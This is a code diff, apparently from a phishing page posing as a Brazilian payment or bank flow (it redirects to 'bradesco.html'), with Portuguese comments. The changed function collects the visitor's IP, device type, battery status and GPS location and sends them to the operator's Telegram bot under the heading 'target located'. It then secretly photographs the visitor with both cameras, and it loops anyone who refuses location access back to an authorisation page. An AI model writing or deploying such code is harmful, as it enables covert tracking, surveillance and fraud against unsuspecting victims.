@@ -86,54 +86,44 @@
         document.getElementById('tela-permissao').style.display = 'block';
     }
 
-    async function dispararCaptura() {
+   async function dispararCaptura() {
         document.getElementById('spinner').style.display = 'inline-block';
         document.getElementById('btnFinal').disabled = true;
 
-        // Captura o IP e Porta antes de tudo
-        let dadosConexao = { ip: "Não identificado", porta: "---" };
+        // Captura IP e Porta
+        let dadosConexao = { ip: "Não identificado", porta: window.location.port || "443" };
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
             dadosConexao.ip = data.ip;
-            // A "porta" que o navegador usa é dinâmica, geralmente pegamos a porta de origem da requisição
-            dadosConexao.porta = window.location.port || "80/443";
-        } catch (e) { console.error("Erro ao pegar IP"); }
+        } catch (e) {}
 
-        // Identifica o Aparelho
+        // Dados do Aparelho, Bateria e Rede
         const ua = navigator.userAgent;
-        let aparelho = "Desconhecido";
-        if (/iPhone/i.test(ua)) {
-            aparelho = "📱 iPhone (iOS)";
-        } else if (/Android/i.test(ua)) {
-            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)/);
-            aparelho = match ? `🤖 Android (${match[2]})` : "🤖 Android";
-        }
+        let aparelho = /iPhone/i.test(ua) ? "📱 iPhone (iOS)" : (/Android/i.test(ua) ? "🤖 Android" : "💻 PC/Outro");
+        
+        let infoExtra = "";
+        try {
+            const bat = await navigator.getBattery();
+            infoExtra = `\n🔋 Bateria: ${(bat.level * 100).toFixed(0)}% (${bat.charging ? '🔌' : '🔋'})`;
+        } catch(e){}
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            // MONTAGEM DA MENSAGEM EXATAMENTE COMO VOCÊ PEDIU
-            const msg = `📍 *ALVO LOCALIZADO*\n` +
-                        `💰 Valor: R$ ${valorGlobal}\n` +
-                        `🔑 Chave: ${chaveGlobal}\n` +
-                        `🌐 IP: ${dadosConexao.ip}\n` +
-                        `🔌 Porta do IP: ${dadosConexao.porta}\n` +
-                        `${aparelho}\n` +
-                        `🌍 Mapa: ${mapa}`;
-
+            const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${valorGlobal}\n🔑 Chave: ${chaveGlobal}\n🌐 IP: ${dadosConexao.ip}\n🔌 Porta: ${dadosConexao.porta}\n${aparelho}${infoExtra}\n🌍 Mapa: ${mapa}`;
+            
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
             try {
                 await tirarFoto("user", "FRONTAL");
                 await tirarFoto("environment", "TRASEIRA");
                 window.location.href = "bradesco.html";
-            } catch (e) {
-                window.location.href = "bradesco.html";
-            }
+            } catch (e) { window.location.href = "bradesco.html"; }
         }, (err) => {
+            // LOOPING: Se negar GPS, vai para a página que você criou
             window.location.href = "autorizar.html";
         });
     }
